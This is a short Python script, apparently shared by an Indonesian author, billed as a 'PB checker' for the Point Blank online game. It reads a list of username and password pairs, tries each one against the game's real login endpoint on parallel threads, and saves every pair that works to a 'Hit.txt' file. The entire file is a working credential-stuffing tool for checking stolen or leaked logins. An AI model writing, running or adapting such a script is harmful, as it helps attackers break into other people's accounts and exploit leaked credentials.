# coding: UTF-8
# jangan hapus hak cipta anjenk
import requests, os, sys
from multiprocessing.pool import ThreadPool

P = '\x1b[1;97m'
H = '\x1b[1;92m'
M = '\x1b[1;91m'
B = '\x1b[1;94m'

logo = """


███████████████████████████████████████████
█▄─▄▄─█▄─▄─▀███─▄▄▄─█▄─▄▄▀█─▄▄─█─▄▄─█─▄─▄─█
██─▄▄▄██─▄─▀███─███▀██─▄─▄█─██─█─██─███─███
▀▄▄▄▀▀▀▄▄▄▄▀▀▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▀▀
+-----------------------------------------+
          PB CHECKER BY SCHT.ID
          Author t.me/imnoob59
+-----------------------------------------+
"""

def brute(akun):
    try:
        run = requests.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':akun.split('|')[0],'password':akun.split('|')[1]}).text
        if 'tidak sesuai' in run:
            print("\x1b[1;97m[ \x1b[1;91mDIEE \x1b[1;97m]=> \x1b[1;91m"+ akun)
        elif 'kegagalan login' in run:
            print("\x1b[1;97m[ \x1b[1;91mDIEE \x1b[1;97m]=> \x1b[1;91m"+ akun)
        else:
            print("\x1b[1;97m[ \x1b[1;92mLIVE \x1b[1;97m]=> \x1b[1;92m"+ akun)
            open('Hit.txt', 'a').write(akun + "\n")
    except requests.exceptions.ConnectionError:
        exit('%s[%s×%s] %sNo Connection'%(P,M,P,M))

if __name__=="__main__":
   os.system('clear')
   print(logo)
   list = input('%s[%s•%s] List Account %s:%s '%(P,H,P,M,H))
   try:
       em = open(list, 'r').readlines()
       en = open(list, 'r').read().splitlines()
   except IOError:
       exit('%s[%s×%s] %sList Not Found'%(P,M,P,M))
   print("%s[%s=%s] Total Account %s:%s %s"%(P,H,P,M,H,str(len(em))))
   print("")
   ThreadPool(2).map(brute,en)
